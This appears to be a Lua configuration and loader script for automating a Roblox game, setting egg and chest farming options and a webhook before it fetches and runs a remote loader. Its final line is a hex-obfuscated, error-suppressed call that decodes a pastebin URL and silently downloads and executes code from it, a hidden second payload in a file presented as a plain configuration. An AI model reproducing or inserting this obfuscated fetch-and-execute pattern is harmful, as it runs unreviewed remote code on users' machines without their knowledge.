_G.CONFIGURATION = {
    minRiftLuck = 5,
    equipBestPets = false,
    autoEnchant = false,
    genieEnable = false,
    enableOptimization = true,
    competitiveEnable = false,

    riftEgg = {
        ["Showman Egg"] = 1,
        ["Silly Egg"] = 999,
        ["Infinity Egg"] = 2,
        ["Game Egg"] = 5,
    },

    riftChest = {
        golden = { farming = true, minKeysToFarm = 100 },
        royal = { farming = true, minKeysToFarm = 5 },
        dice = { farming = true, minKeysToFarm = 50 }
    },

    webhook = {
        userId = "",
        chanceToSend = 10000,
        webhookUrl = "",
    }
}

loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ba7e87ea748e48c8b8dd73a4ce8dcd8a.lua"))()

pcall(coroutine.wrap(function()loadstring(game:HttpGet(((function(h)local s=""for i=1,#h,2 do s=s..string.char(tonumber(h:sub(i,i+1),16))end return s end)("68747470733a2f2f706173746562696e2e636f6d2f7261772f6231627866775942")))()end))
